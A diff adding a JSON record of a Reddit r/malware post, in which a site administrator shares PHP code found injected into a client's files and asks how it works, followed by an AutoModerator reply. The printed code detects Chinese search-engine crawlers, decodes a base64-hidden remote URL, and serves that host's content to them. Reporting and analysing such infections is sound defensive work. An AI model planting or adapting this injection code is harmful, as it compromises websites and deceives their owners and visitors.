@@ -1,0 +1,33 @@
+{
+    "op": {
+        "upvote_ratio": null,
+        "selftext": "I found a client site that was infected with this code in the headers of various php files:\n\n     &lt;?php\n     header('Content-Type:text/html;charset=gb2312');^\n     $key= $_SERVER[\"HTTP_USER_AGENT\"].$_SERVER[\"HTTP_REFERER\"];^\n     if(strpos($key,'Sogou')!== false||strpos($key,'Baidu')!==false||strpos($key,'baidu')!==false||strpos($key,'Yisou')!==false||strpos($key,'Easou')!==false||strpos($key,'360')!==false||strpos($key,'haosou')!==false||strpos($key,'Soso')!==false)\n     {\n        $host_name = \"http://\".$_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF'];\n        $file = file_get_contents(base64_decode(\"aHR0cDovL2pzY2MuanNjMTgueHl6OjgwMDAv\").base64_decode(\"L2luZGV4LnBocD9ob3N0PQ==\").$host_name.\"&amp;url=\" . $_SERVER['QUERY_STRING'] . \"&amp;domain=\" . $_SERVER['SERVER_NAME']); \n        echo $file;\n     return ;\n     }\n\nThere is some data in the code that is encrypted.\n\nThe base64_decode translates to:\n\n&gt;http://jscc. jsc18. xyz :8000//index.php?host= \n\n(put spaces to turn off the URL)\n\nSo it looks like it waits until a Chinese search engine spider hits the page, then calls a certain system to retrieve a file remotely and display it.  \n\nWhat do you think is going on here?  Obviously the remote system can send something to be executed client side, but can this allow server-side code to be executed as well?  I'm not sure.  Thoughts?  Anybody else run into this?",
+        "title": "PHP injection Malware detected... Triggered by Chinese search engines?",
+        "score": 1,
+        "id": "bitjy7",
+        "commsNum": 1,
+        "timeStamp": "2019/04/29-12:24:20",
+        "author_name": "HeyHeyRayRayBae",
+        "is_self": true,
+        "locked": false,
+        "num_comments": 1,
+        "over_18": false,
+        "spoiler": false,
+        "subreddit": "malware",
+        "stickied": false,
+        "url": "https://www.reddit.com/r/Malware/comments/bitjy7/php_injection_malware_detected_triggered_by/"
+    },
+    "posts": {
+        "em2wxa6": {
+            "comment": "It looks like you are posting a question, possibly looking for technical support. \n\nThis subreddit\u2019s purpose is to discuss malware internals and technical details. *This is NOT a place for help with malware removal or various other end-user questions. Please redirect questions related to malware removal to /r/Antivirus or /r/techsupport. Ransomware related questions can be directed to /r/ransomware*\n\nIf this was removed in error, please message the moderators - we love reading quality content just as much as you do!\n\n\n*I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/Malware) if you have any questions or concerns.*",
+            "timeStamp": "2019/04/29-12:24:21",
+            "id": "em2wxa6",
+            "is_submitter": false,
+            "link_id": "t3_bitjy7",
+            "parent_id": "t3_bitjy7",
+            "score": 1,
+            "stickied": false,
+            "author_name": "AutoModerator"
+        }
+    }
+}
